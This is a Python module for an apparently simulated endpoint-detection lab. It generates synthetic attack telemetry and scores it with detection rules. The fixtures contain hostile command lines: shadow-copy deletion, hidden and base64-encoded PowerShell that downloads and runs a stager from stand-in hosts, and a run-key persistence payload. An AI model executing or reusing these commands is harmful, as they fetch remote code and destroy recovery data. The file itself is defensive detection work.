from typing import Optional, List, Dict, Any
from pydantic import BaseModel, Field
import time
import uuid

from .common import (
    StandardEngineResponse,
    AnalysisMode,
    Verdict,
    Severity,
    Finding,
    EvidenceItem,
    TriggeredRule
)

class EndpointEvent(BaseModel):
    event_id: str = Field(default_factory=lambda: f"EVT-{uuid.uuid4().hex[:6].upper()}")
    timestamp_offset_sec: int = 0
    event_type: str  # process_creation, persistence, extension, usb, file_activity
    details: Dict[str, Any]

class EndpointAnalysisRequest(BaseModel):
    events: Optional[List[EndpointEvent]] = None
    scenario_preset: Optional[str] = "macro_powershell"

def generate_preset_endpoint_events(preset: str) -> List[EndpointEvent]:
    if preset == "ransomware_activity":
        return [
            EndpointEvent(
                timestamp_offset_sec=0,
                event_type="process_creation",
                details={
                    "parent_process": "explorer.exe",
                    "process_name": "svchost_update.exe",
                    "pid": 3492,
                    "command_line": "C:\\Users\\Operator\\AppData\\Local\\Temp\\svchost_update.exe -run",
                    "user": "DOMAIN\\FinanceUser"
                }
            ),
            EndpointEvent(
                timestamp_offset_sec=4,
                event_type="process_creation",
                details={
                    "parent_process": "svchost_update.exe",
                    "process_name": "vssadmin.exe",
                    "pid": 5812,
                    "command_line": "vssadmin.exe delete shadows /all /quiet",
                    "user": "NT AUTHORITY\\SYSTEM"
                }
            ),
            EndpointEvent(
                timestamp_offset_sec=9,
                event_type="file_activity",
                details={
                    "operation": "bulk_rename",
                    "path_pattern": "C:\\Users\\FinanceUser\\Documents\\*.locked",
                    "count_per_sec": 142,
                    "entropy": 7.96,
                    "ransom_note_dropped": "RESTORE_FILES_INFO.txt"
                }
            )
        ]
    elif preset == "usb_badusb":
        return [
            EndpointEvent(
                timestamp_offset_sec=0,
                event_type="usb",
                details={
                    "device_name": "Generic USB Flash Disk",
                    "vendor_id": "0x1234",
                    "product_id": "0x5678",
                    "hardware_class": "HID_Keyboard_Emulator",
                    "action": "device_inserted"
                }
            ),
            EndpointEvent(
                timestamp_offset_sec=2,
                event_type="process_creation",
                details={
                    "parent_process": "csrss.exe",
                    "process_name": "powershell.exe",
                    "pid": 6012,
                    "command_line": "powershell -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.22/stager.ps1')\"",
                    "typing_speed_wpm": 650,
                    "user": "DOMAIN\\WorkstationAdmin"
                }
            )
        ]
    elif preset == "malicious_extension":
        return [
            EndpointEvent(
                timestamp_offset_sec=0,
                event_type="extension",
                details={
                    "extension_id": "gknplkdmbplddfkjjghjhkkjhkjhjhkh",
                    "name": "Free PDF Pro Converter 2026",
                    "browser": "Google Chrome",
                    "permissions": ["<all_urls>", "webRequest", "webRequestBlocking", "cookies", "storage"],
                    "content_scripts": ["https://*/*"],
                    "background_script_hash": "a4f89d8928bf1e33c873491910248a313b56417730e28f237bf421e9fbfb4109"
                }
            )
        ]
    else:  # default: macro_powershell
        return [
            EndpointEvent(
                timestamp_offset_sec=0,
                event_type="process_creation",
                details={
                    "parent_process": "outlook.exe",
                    "process_name": "winword.exe",
                    "pid": 4104,
                    "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Operator\\Downloads\\Invoice_Q3.docm\"",
                    "user": "CORP\\Employee"
                }
            ),
            EndpointEvent(
                timestamp_offset_sec=3,
                event_type="process_creation",
                details={
                    "parent_process": "winword.exe",
                    "process_name": "cmd.exe",
                    "pid": 5892,
                    "command_line": "cmd.exe /c start /b powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwB0AGEAZwBlAHIALgBsAG8AYwBhAGwALwBwAC4AcABzADEAJwApAA==",
                    "user": "CORP\\Employee"
                }
            ),
            EndpointEvent(
                timestamp_offset_sec=8,
                event_type="persistence",
                details={
                    "method": "registry_run_key",
                    "target_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityUpdate",
                    "payload": "powershell.exe -w hidden -enc JABzAD0...",
                    "action": "registry_value_set"
                }
            )
        ]

def analyze_endpoint_events(request: EndpointAnalysisRequest) -> StandardEngineResponse:
    events = request.events or generate_preset_endpoint_events(request.scenario_preset or "macro_powershell")
    
    findings: List[Finding] = []
    evidence_items: List[EvidenceItem] = []
    triggered_rules: List[TriggeredRule] = []
    recommendations: List[str] = []
    risk_score = 0

    for idx, evt in enumerate(events):
        dt = evt.details
        evidence_items.append(EvidenceItem(
            source="SyntheticEndpointTelemetry",
            type=evt.event_type,
            description=f"[{evt.event_type.upper()}] Event #{idx+1} at T+{evt.timestamp_offset_sec}s: {dt.get('process_name') or dt.get('name') or dt.get('device_name') or dt.get('operation')}",
            raw_data=dt
        ))

        # Rule: Office spawning scripting interpreter
        if evt.event_type == "process_creation":
            parent = (dt.get("parent_process") or "").lower()
            proc = (dt.get("process_name") or "").lower()
            cmd = (dt.get("command_line") or "").lower()

            if any(office_app in parent for office_app in ["winword", "excel", "powerpnt", "outlook"]) and any(shell in proc for shell in ["powershell", "cmd.exe", "wscript", "cscript"]):
                risk_score += 45
                findings.append(Finding(
                    id=f"F-M04-OFFICE-SPAWN-{evt.event_id}",
                    title="Suspicious Child Process Spawning from Productivity Suite",
                    severity=Severity.CRITICAL,
                    description=f"{dt.get('parent_process')} spawned {dt.get('process_name')} with suspicious arguments.",
                    mitre_id="T1059.001",
                    evidence=dt.get("command_line")
                ))
                triggered_rules.append(TriggeredRule(
                    rule_id="RULE-EDR-001",
                    name="Productivity App Spawning Script Interpreter",
                    severity=Severity.CRITICAL,
                    points=45,
                    description="Office or Mail process launched an interactive shell or script interpreter.",
                    mitre_id="T1059.001"
                ))

            # Rule: Encoded or hidden PowerShell execution
            if "powershell" in proc and ("-enc" in cmd or "hidden" in cmd or "downloadstring" in cmd):
                risk_score += 40
                findings.append(Finding(
                    id=f"F-M04-PS-ENC-{evt.event_id}",
                    title="Obfuscated Encoded PowerShell Execution",
                    severity=Severity.HIGH,
                    description="PowerShell executed with -EncodedCommand or hidden window flag, typically used for stage-1 loader evasion.",
                    mitre_id="T1027",
                    evidence=dt.get("command_line")
                ))
                triggered_rules.append(TriggeredRule(
                    rule_id="RULE-EDR-002",
                    name="Obfuscated PowerShell Script Execution",
                    severity=Severity.HIGH,
                    points=40,
                    description="Detected encoded/hidden PowerShell invocation.",
                    mitre_id="T1027"
                ))

            # Rule: Volume Shadow Copy deletion
            if "vssadmin" in proc and "delete" in cmd and "shadows" in cmd:
                risk_score += 55
                findings.append(Finding(
                    id=f"F-M04-VSSADMIN-{evt.event_id}",
                    title="Volume Shadow Copy Deletion (Inhibit System Recovery)",
                    severity=Severity.CRITICAL,
                    description="Command vssadmin.exe used to purge restore points, classic indicator of ransomware pre-encryption stage.",
                    mitre_id="T1490",
                    evidence=dt.get("command_line")
                ))
                triggered_rules.append(TriggeredRule(
                    rule_id="RULE-EDR-005",
                    name="Inhibit System Recovery (VSS Wipe)",
                    severity=Severity.CRITICAL,
                    points=55,
                    description="Shadow copies purged to prevent offline file restoration.",
                    mitre_id="T1490"
                ))

        # Rule: Persistence via Run Keys / Scheduled Tasks
        elif evt.event_type == "persistence":
            risk_score += 35
            findings.append(Finding(
                id=f"F-M04-PERSIST-{evt.event_id}",
                title="Autostart Registry Run Key Persistence Established",
                severity=Severity.HIGH,
                description=f"Persistent payload registered at: {dt.get('target_path')}",
                mitre_id="T1547.001",
                evidence=str(dt.get("payload"))
            ))
            triggered_rules.append(TriggeredRule(
                rule_id="RULE-EDR-010",
                name="Registry Autostart Run Key Modification",
                severity=Severity.HIGH,
                points=35,
                description="Executable or script configured for persistent boot startup.",
                mitre_id="T1547.001"
            ))

        # Rule: Excessive Extension Permissions
        elif evt.event_type == "extension":
            perms = dt.get("permissions", [])
            if "<all_urls>" in perms and "webRequestBlocking" in perms:
                risk_score += 50
                findings.append(Finding(
                    id=f"F-M04-EXT-PERMS-{evt.event_id}",
                    title="High-Privilege Browser Extension with All-URL Interception",
                    severity=Severity.CRITICAL,
                    description=f"Extension '{dt.get('name')}' holds <all_urls> and webRequestBlocking permissions, capable of reading and modifying all web traffic and cookies.",
                    mitre_id="T1176",
                    evidence=f"Permissions: {', '.join(perms)}"
                ))
                triggered_rules.append(TriggeredRule(
                    rule_id="RULE-EDR-020",
                    name="High-Risk Extension Permission Set",
                    severity=Severity.CRITICAL,
                    points=50,
                    description="Browser extension holds full web intercept and credential read rights.",
                    mitre_id="T1176"
                ))

        # Rule: Rogue USB Keystroke Injection (BadUSB)
        elif evt.event_type == "usb":
            hw_class = dt.get("hardware_class", "")
            if hw_class == "HID_Keyboard_Emulator":
                risk_score += 45
                findings.append(Finding(
                    id=f"F-M04-USB-HID-{evt.event_id}",
                    title="Suspected BadUSB Keystroke Injection Device",
                    severity=Severity.HIGH,
                    description=f"Mass-storage shaped device identified itself as a Human Interface Device (HID Keyboard Emulator).",
                    mitre_id="T1052.001",
                    evidence=f"Device: {dt.get('device_name')} (Class: {hw_class})"
                ))
                triggered_rules.append(TriggeredRule(
                    rule_id="RULE-EDR-030",
                    name="Hardware HID Keystroke Emulator Anomaly",
                    severity=Severity.HIGH,
                    points=45,
                    description="Rogue USB device presented HID keyboard class for unauthorized command injection.",
                    mitre_id="T1052.001"
                ))

        # Rule: Bulk File Encryption Pattern
        elif evt.event_type == "file_activity":
            count = dt.get("count_per_sec", 0)
            entropy = dt.get("entropy", 0.0)
            if count > 50 or entropy > 7.5:
                risk_score += 60
                findings.append(Finding(
                    id=f"F-M04-RANSOM-ENC-{evt.event_id}",
                    title="Rapid Bulk High-Entropy File Renaming (Ransomware Heuristic)",
                    severity=Severity.CRITICAL,
                    description=f"High-frequency file renames ({count}/s) with high Shannon entropy ({entropy:.2f}/8.0) matching cryptographic encryption.",
                    mitre_id="T1486",
                    evidence=f"Pattern: {dt.get('path_pattern')} | Note: {dt.get('ransom_note_dropped')}"
                ))
                triggered_rules.append(TriggeredRule(
                    rule_id="RULE-EDR-040",
                    name="Data Encrypted for Impact (Ransomware Heuristic)",
                    severity=Severity.CRITICAL,
                    points=60,
                    description="Rapid alteration of files with high entropy and ransom note creation.",
                    mitre_id="T1486"
                ))

    risk_score = min(100, max(0, risk_score))
    if risk_score >= 70:
        verdict = Verdict.MALICIOUS
        summary = "CRITICAL ENDPOINT THREAT DETECTED: Malicious process execution, persistence or destructive activity verified."
        recommendations = [
            "Initiate immediate network isolation for this endpoint",
            "Terminate parent and child process trees (PIDs flagged in findings)",
            "Remove persistent registry keys / scheduled tasks",
            "Preserve system memory and volatile triage image for forensic IR"
        ]
    elif risk_score >= 30:
        verdict = Verdict.SUSPICIOUS
        summary = "SUSPICIOUS ENDPOINT ACTIVITY: Elevated permissions or anomalous process spawning requires triage."
        recommendations = [
            "Inspect user session audit log",
            "Verify whether script invocation was authorized administrative work",
            "Quarantine unapproved browser extensions"
        ]
    else:
        verdict = Verdict.SAFE
        summary = "Endpoint events analyzed. No malicious script execution, persistence, or ransomware heuristics triggered."
        recommendations = [
            "Maintain continuous endpoint telemetry collection",
            "Keep endpoint protection signatures updated"
        ]

    return StandardEngineResponse(
        engine_id="M-04",
        engine_name="Endpoint Security Lab",
        analysis_mode=AnalysisMode.SIMULATED,
        verdict=verdict,
        risk_score=risk_score,
        confidence=0.96,
        summary=summary,
        findings=findings,
        evidence=evidence_items,
        triggered_rules=triggered_rules,
        recommendations=recommendations,
        limitations=[
            "Deterministic analysis of synthetic endpoint telemetry events; does not install kernel drivers or monitor actual host OS."
        ],
        metadata={
            "total_events_analyzed": len(events),
            "preset_applied": request.scenario_preset or "custom",
            "mitre_tactics": list(set(f.mitre_id for f in findings if f.mitre_id))
        }
    )
